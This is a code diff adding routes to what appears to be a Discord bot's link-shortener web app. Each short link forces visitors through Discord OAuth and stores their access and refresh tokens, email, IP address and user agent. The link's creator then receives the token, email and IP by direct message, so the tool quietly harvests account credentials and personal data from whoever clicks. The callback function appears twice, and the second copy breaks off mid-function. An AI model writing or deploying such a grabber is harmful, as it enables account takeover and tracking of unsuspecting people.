@@ -493,3 +493,222 @@ async def notify_oauth_success(creator_id, short_id, user_id, username, email, a
         
     except Exception as e:
         print(f"Erreur notification OAuth: {e}")
+
+@app.route('/link/<short_id>')
+def shortlink_redirect(short_id):
+    """Redirige vers OAuth Discord avant d'accéder au lien"""
+    # Vérifier que le lien existe
+    conn = sqlite3.connect("links.db")
+    cursor = conn.cursor()
+    cursor.execute('SELECT original_url FROM custom_links WHERE id = ?', (short_id,))
+    result = cursor.fetchone()
+    conn.close()
+
+    if not result:
+        return "Lien non trouvé", 404
+
+    # Récupérer les informations du visiteur
+    user_agent_str = request.headers.get('User-Agent', 'Unknown')
+    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip_address:
+        if ',' in ip_address:
+            ip_address = ip_address.split(',')[0].strip()
+    else:
+        ip_address = 'Inconnu'
+
+    # Rediriger vers Discord OAuth
+    params = {
+        'client_id': DISCORD_CLIENT_ID,
+        'redirect_uri': DISCORD_REDIRECT_URI,
+        'response_type': 'code',
+        'scope': 'identify email guilds',
+        'state': short_id  # Passer l'ID du lien comme state
+    }
+
+    oauth_url = f"https://discord.com/api/oauth2/authorize?{urlencode(params)}"
+    return redirect(oauth_url)
+
+@app.route('/oauth/callback')
+def oauth_callback():
+    """Callback OAuth2 - Échange le code contre un token"""
+    code = request.args.get('code')
+    state = request.args.get('state')  # C'est notre short_id
+
+    if not code or not state:
+        return "Erreur OAuth", 400
+
+    # Échanger le code contre un access token
+    data = {
+        'client_id': DISCORD_CLIENT_ID,
+        'client_secret': DISCORD_CLIENT_SECRET,
+        'grant_type': 'authorization_code',
+        'code': code,
+        'redirect_uri': DISCORD_REDIRECT_URI
+    }
+
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+    response = requests.post(
+        'https://discord.com/api/oauth2/token',
+        data=data,
+        headers=headers
+    )
+
+    if response.status_code != 200:
+        return "Erreur lors de l'authentification", 400
+
+    token_data = response.json()
+    access_token = token_data.get('access_token')
+    refresh_token = token_data.get('refresh_token')
+
+    # Récupérer les infos de l'utilisateur
+    user_response = requests.get(
+        'https://discord.com/api/users/@me',
+        headers={'Authorization': f'Bearer {access_token}'}
+    )
+
+    user_data = user_response.json()
+    user_id = user_data.get('id')
+    username = user_data.get('username')
+    email = user_data.get('email')
+
+    # Enregistrer le token dans la base de données
+    conn = sqlite3.connect("links.db")
+    cursor = conn.cursor()
+
+    # Créer la table si elle n'existe pas
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS oauth_tokens (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            short_id TEXT NOT NULL,
+            user_id TEXT NOT NULL,
+            username TEXT,
+            email TEXT,
+            access_token TEXT NOT NULL,
+            refresh_token TEXT,
+            ip_address TEXT,
+            user_agent TEXT,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            FOREIGN KEY(short_id) REFERENCES custom_links(id)
+        )
+    ''')
+
+    # Extraire les infos du visiteur
+    user_agent_str = request.headers.get('User-Agent', 'Unknown')
+    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ',' in ip_address:
+        ip_address = ip_address.split(',')[0].strip()
+
+    # Enregistrer le token
+    cursor.execute('''
+        INSERT INTO oauth_tokens (short_id, user_id, username, email, access_token, refresh_token, ip_address, user_agent)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+    ''', (state, user_id, username, email, access_token, refresh_token, ip_address, user_agent_str))
+
+    # Récupérer le lien original
+    cursor.execute('SELECT original_url, user_id FROM custom_links WHERE id = ?', (state,))
+    result = cursor.fetchone()
+
+    if not result:
+        conn.close()
+        return "Lien non trouvé", 404
+
+    original_url, creator_id = result
+
+    # Incrémenter le compteur de clics
+    cursor.execute('UPDATE custom_links SET clicks = clicks + 1 WHERE id = ?', (state,))
+
+    conn.commit()
+    conn.close()
+
+    # Notifier le créateur du lien en DM
+    if bot_instance:
+        try:
+            asyncio.run_coroutine_threadsafe(
+                notify_oauth_success(creator_id, state, user_id, username, email, access_token, ip_address),
+                bot_instance.loop
+            )
+        except Exception as e:
+            print(f"Erreur notification: {e}")
+
+    # Rediriger vers l'URL originale
+    return redirect(original_url)
+
+import logging
+
+logging.basicConfig(level=logging.DEBUG)
+
+@app.route('/oauth/callback')
+def oauth_callback():
+    """Callback OAuth2 - Échange le code contre un token"""
+    code = request.args.get('code')
+    state = request.args.get('state')  # C'est notre short_id
+
+    if not code or not state:
+        logging.error("Erreur OAuth: code ou state manquant")
+        return "Erreur OAuth", 400
+
+    # Échanger le code contre un access token
+    data = {
+        'client_id': DISCORD_CLIENT_ID,
+        'client_secret': DISCORD_CLIENT_SECRET,
+        'grant_type': 'authorization_code',
+        'code': code,
+        'redirect_uri': DISCORD_REDIRECT_URI
+    }
+
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+    response = requests.post(
+        'https://discord.com/api/oauth2/token',
+        data=data,
+        headers=headers
+    )
+
+    if response.status_code != 200:
+        logging.error("Erreur lors de l'authentification: %s", response.text)
+        return "Erreur lors de l'authentification", 400
+
+    token_data = response.json()
+    access_token = token_data.get('access_token')
+    refresh_token = token_data.get('refresh_token')
+
+    # Récupérer les infos de l'utilisateur
+    user_response = requests.get(
+        'https://discord.com/api/users/@me',
+        headers={'Authorization': f'Bearer {access_token}'}
+    )
+
+    user_data = user_response.json()
+    user_id = user_data.get('id')
+    username = user_data.get('username')
+    email = user_data.get('email')
+
+    # Enregistrer le token dans la base de données
+    conn = sqlite3.connect("links.db")
+    cursor = conn.cursor()
+
+    # Créer la table si elle n'existe pas
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS oauth_tokens (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            short_id TEXT NOT NULL,
+            user_id TEXT NOT NULL,
+            username TEXT,
+            email TEXT,
+            access_token TEXT NOT NULL,
+            refresh_token TEXT,
+            ip_address TEXT,
+            user_agent TEXT,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            FOREIGN KEY(short_id) REFERENCES custom_links(id)
+        )
+    ''')
+
+    # Extraire les infos du visiteur
+    user_agent_str = request.headers.get('User-Agent', 'Unknown')
+    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ',' in ip_address:
+        ip_address = ip_address.split(',')[0].strip()
+
+    # Enregistrer le token
